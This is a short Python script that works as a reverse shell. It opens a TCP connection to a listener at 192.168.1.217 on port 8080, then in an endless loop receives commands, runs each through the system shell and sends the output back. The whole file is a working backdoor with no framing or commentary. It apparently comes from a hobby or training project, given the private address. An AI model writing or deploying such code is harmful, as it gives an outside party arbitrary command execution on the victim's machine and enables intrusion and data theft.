import socket
import subprocess

class MySocket:
    def __init__(self, ip, port):
        self.my_connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.my_connection.connect((ip , port))

    def command_execution(self,command):
        return subprocess.check_output(command, shell=True)


    def start_socket(self):
        while True:
            command = self.my_connection.recv(1024)
            command_output = self.command_execution(command)
            self.my_connection.send(command_output)
        self.my_connection.close()

my_socket_object = MySocket("192.168.1.217",8080)
my_socket_object.start_socket()